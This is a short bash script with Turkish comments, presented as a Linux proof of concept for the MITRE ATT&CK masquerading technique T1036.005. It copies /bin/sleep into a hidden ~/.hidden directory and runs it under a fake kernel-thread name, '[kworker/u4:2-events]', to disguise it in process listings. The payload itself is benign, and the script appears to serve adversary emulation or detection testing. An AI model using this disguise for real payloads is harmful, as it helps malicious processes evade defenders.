#!/bin/bash
#T1036.005 - Masquerading PoC (Linux) - KESIN COZUM

echo "Masquerading (Gizlenme) saldirisi basliyor..."

PAYLOAD_DIR="$HOME/.hidden"
PAYLOAD_FILE="$PAYLOAD_DIR/payload"

mkdir -p "$PAYLOAD_DIR"

# 1. Payload olarak sistemdeki sleep binary'sini kullaniyoruz
cp /bin/sleep "$PAYLOAD_FILE"
chmod +x "$PAYLOAD_FILE"

echo "Payload hazirlandi: $PAYLOAD_FILE"

# 2. Sahte isim (Icinde slash olsa bile exec -a ile ps'e basilabilir)
FAKE_PROCESS_NAME="[kworker/u4:2-events]"

echo "Payload, $FAKE_PROCESS_NAME ismiyle arka planda baslatiliyor..."

# 3. Binary'yi exec -a ile calistiriyoruz ki isim Kernel tarafindan ezilmesin!
bash -c "exec -a '$FAKE_PROCESS_NAME' '$PAYLOAD_FILE' 600" &

sleep 1 

echo "Islem tamam. ps' te payload'u arayin:"
echo "--------------------------------------------------------"
ps aux | grep -v grep | grep "kworker" | sort -k1 -r | head -n 5
echo "--------------------------------------------------------"
echo "Yukaridaki listede USER yetkisiyle calisan surec bizim FAKE process'imizdir."